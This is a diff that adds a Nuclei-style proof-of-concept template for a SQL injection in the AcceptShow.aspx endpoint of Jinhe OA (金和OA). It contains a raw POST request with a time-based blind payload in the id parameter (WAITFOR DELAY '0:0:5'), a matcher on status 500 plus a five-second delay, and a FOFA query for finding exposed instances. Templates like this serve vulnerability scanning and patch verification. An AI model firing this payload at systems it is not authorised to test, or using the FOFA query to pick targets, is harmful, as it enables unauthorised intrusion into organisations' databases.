@@ -1,0 +1,29 @@
+id: poc-hkhqc6r4l7zg4i3y
+info:
+  name: 金和OA JHsoft.Web.AcceptAip AcceptShow.aspx 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hkhqc6r4l7zg4i3y
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hkhqc6r4l7zg4i3y
+    fofa: app="金和网络-金和OA
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.AcceptAip/AcceptShow.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    id=-1''WAITFOR DELAY ''0:0:5'''
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 500 && duration >= 5
+    condition: and
